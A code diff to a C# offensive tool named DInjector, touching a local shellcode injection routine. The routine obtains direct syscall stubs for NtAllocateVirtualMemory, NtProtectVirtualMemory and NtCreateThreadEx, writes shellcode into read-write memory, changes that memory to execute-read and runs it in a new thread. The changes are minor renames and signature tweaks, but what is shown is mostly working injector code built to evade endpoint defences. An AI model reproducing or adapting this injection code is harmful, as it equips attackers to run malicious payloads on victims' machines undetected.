@@ -23,7 +23,7 @@ namespace DInjector
             ref IntPtr BaseAddress,
             ref IntPtr RegionSize,
             uint NewProtect,
-            ref uint OldProtect);
+            out uint OldProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
@@ -48,7 +48,7 @@ namespace DInjector
         {
             var shellcode = shellcodeBytes;
 
-            #region NtAllocateVirtualMemory
+            #region NtAllocateVirtualMemory (PAGE_READWRITE)
 
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
             NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
@@ -67,38 +67,36 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtAllocateVirtualMemory");
+                Console.WriteLine("(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(CurrentThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
             }
 
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
             #endregion
 
-            #region NtProtectVirtualMemory
+            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
             NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
-
-            uint oldProtect = 0;
 
             ntstatus = sysNtProtectVirtualMemory(
                 Process.GetCurrentProcess().Handle,
                 ref baseAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
-                ref oldProtect);
+                out uint _);
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
+                Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
             }
 
             #endregion
@@ -125,11 +123,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtCreateThreadEx");
+                Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtCreateThreadEx: {ntstatus}");
+                Console.WriteLine($"(CurrentThread) [-] NtCreateThreadEx: {ntstatus}");
             }
 
             #endregion
@@ -146,11 +144,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtWaitForSingleObject");
+                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtWaitForSingleObject: {ntstatus}");
+                Console.WriteLine($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");
             }
 
             #endregion
